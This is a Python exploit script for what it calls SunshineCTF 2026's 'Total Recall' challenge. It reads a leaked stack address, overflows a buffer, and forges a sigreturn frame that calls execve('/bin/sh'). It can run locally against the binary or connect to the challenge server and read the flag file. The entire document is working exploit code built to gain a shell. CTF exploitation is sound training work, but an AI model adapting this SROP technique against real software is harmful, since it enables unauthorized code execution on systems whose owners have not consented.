#!/usr/bin/env python3
"""SROP exploit for SunshineCTF 2026's Total Recall."""
import socket
import struct
import subprocess
import sys
import time

READ = 0x40104f
SYSCALL = 0x401014


def p64(value):
    return struct.pack('<Q', value)


def build_payload(leak):
    # func2's read begins at leak-0x80 and overwrites RIP at leak.
    # After the first ret, RSP=leak+8.  The second ret leaves RSP=leak+16.
    frame_addr = leak + 16
    path_addr = frame_addr + 0x200
    frame = bytearray(0x200)
    registers = {
        0x68: path_addr,           # rdi = "/bin/sh"
        0x70: 0,                   # rsi = NULL
        0x88: 0,                   # rdx = NULL
        0x90: 59,                  # rax = execve
        0xa0: frame_addr + 0x200, # rsp; unused on success
        0xa8: SYSCALL,             # rip = syscall
        0xb0: 0x202,               # rflags
        0xb8: 0x33,                # cs; ss=0 lets kernel fix it
    }
    for offset, value in registers.items():
        frame[offset:offset + 8] = p64(value)
    return b'A'*0x80 + p64(READ) + p64(SYSCALL) + frame + b'/bin/sh\0'


def main():
    p = subprocess.Popen(['./total_recall'], stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         bufsize=0)
    leak_bytes = p.stdout.read(8)
    assert len(leak_bytes) == 8, 'No stack leak'
    leak = struct.unpack('<Q', leak_bytes)[0]
    print(f'[+] Stack leak: {leak:#x}', flush=True)

    p.stdin.write(b'A'*24)             # func1's harmless read
    p.stdin.flush()
    p.stdin.write(build_payload(leak)) # func2's overflowing read
    p.stdin.flush()
    time.sleep(0.05)                   # let the first read return before stage 3
    p.stdin.write(b'B'*15)             # second read => rax=15
    p.stdin.flush()
    time.sleep(0.15)                    # do not mix commands into read(1024)
    if p.poll() is not None:
        print(f'[-] Process exited with {p.returncode}')
        print(p.stderr.read().decode(errors='replace'))
        return

    p.stdin.write(b'echo SROP_OK; id; exit\n')
    p.stdin.flush()
    p.stdin.close()
    out = p.stdout.read().decode(errors='replace')
    p.wait(timeout=2)
    print(out, end='')
    print(f'[+] Exit status: {p.returncode}')


def remote(host='chal.sunshinectf.games', port=26003):
    with socket.create_connection((host, port), timeout=5) as s:
        s.settimeout(5)
        leak_bytes = b''
        while len(leak_bytes) < 8:
            chunk = s.recv(8 - len(leak_bytes))
            if not chunk:
                raise EOFError('No stack leak')
            leak_bytes += chunk
        leak = struct.unpack('<Q', leak_bytes)[0]
        print(f'[+] Stack leak: {leak:#x}', flush=True)
        s.sendall(b'A' * 24)
        s.sendall(build_payload(leak))
        time.sleep(0.2)
        s.sendall(b'B' * 15)
        time.sleep(0.2)
        s.sendall(b'cat /ctf/flag.txt; exit\n')
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            print(chunk.decode(errors='replace'), end='', flush=True)


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        remote(sys.argv[2] if len(sys.argv) > 2 else 'chal.sunshinectf.games',
               int(sys.argv[3]) if len(sys.argv) > 3 else 26003)
    else:
        main()
